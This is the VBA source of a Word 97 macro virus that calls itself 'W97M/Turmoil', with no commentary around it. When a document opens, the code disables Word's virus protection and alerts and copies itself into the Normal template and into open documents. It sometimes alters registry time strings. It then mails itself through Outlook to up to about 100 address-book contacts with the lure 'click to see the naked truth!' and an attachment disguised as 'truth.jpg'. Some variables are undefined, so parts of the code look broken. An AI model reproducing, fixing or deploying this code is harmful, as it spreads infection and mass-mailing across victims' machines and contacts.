   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub document_open()
   On Error Resume Next

   With Options
   .VirusProtection = 0
   .SaveNormalPrompt = 0
   .ConfirmConversions = 0
   End With
   With Application
   .EnableCancelKey = wdCancelDisabled
   .ScreenUpdating = 0
   .DisplayAlerts = wdAlertsNone
   .DisplayStatusBar = 0
   End With

   Set norm = NormalTemplate.VBProject.VBComponents
   Set adoc = ActiveDocument.VBProject.VBComponents
   Const virii = "W97M/Turmoil"

   Open "c:\turmoil.vxd" For Output As #1
   Print #1, Application.VBE.ActiveVBProject.VBComponents.Item(1).codemodule.lines(1, Application.VBE.ActiveVBProject.VBComponents.Item(1).codemodule.CountOfLines)
   Close #1

   If norm.Item(1).codemodule.lines(72, 1) <> "'w97m/turmoil" Then
   norm.Item(1).codemodule.AddFromFile ("c:\turmoil.vxd")
   End If
   If adoc.Item(1).codemodule.lines(72, 1) <> "w97m/turmoil" Then
   adoc.Item(1).codemodule.AddFromFile ("c:\turmoil.vxd")
   End If

   turmoil = Int(Rnd(13) + 1)
   If turmoil = 13 Then
   System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\CONTROL PANEL\INTERNATIONAL", "s1159") = "Turmoil"
   System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\CONTROL PANEL\INTERNATIONAL", "s2359") = "Turmoil"
   End If

   ActiveDocument.SaveAs = "c:\turmoil.doc"
   Set outapp = CreateObject("outlook.application")
   Set mapi = a.GetNameSpace("MAPI")
   If outapp = "Outlook" Then
   mapi.Logon "profile", "password"
   For x = 1 To mapi.AddressLists.Count
   Set y = mapi.AddressLists(y)
   x = 1
   Set tml = outapp.CreateItem(0)
   For xx = 1 To d.AddressEntries.Count
   e = y.AddressEntries(x)
   tml.Recipients.Add e
   x = x + 1
   If x > 101 Then xx = y.AddressEntries.Count
   Next xx
   tml.Subject = "hello"
   tml.Body = ".click to see the naked truth!"
   tml.attachments.Add "c:\turmoil.doc", 1, 1, "truth.jpg"
   tml.Send
   e = ""
   Next y
   mapi.Logoff
   End If

   End Sub
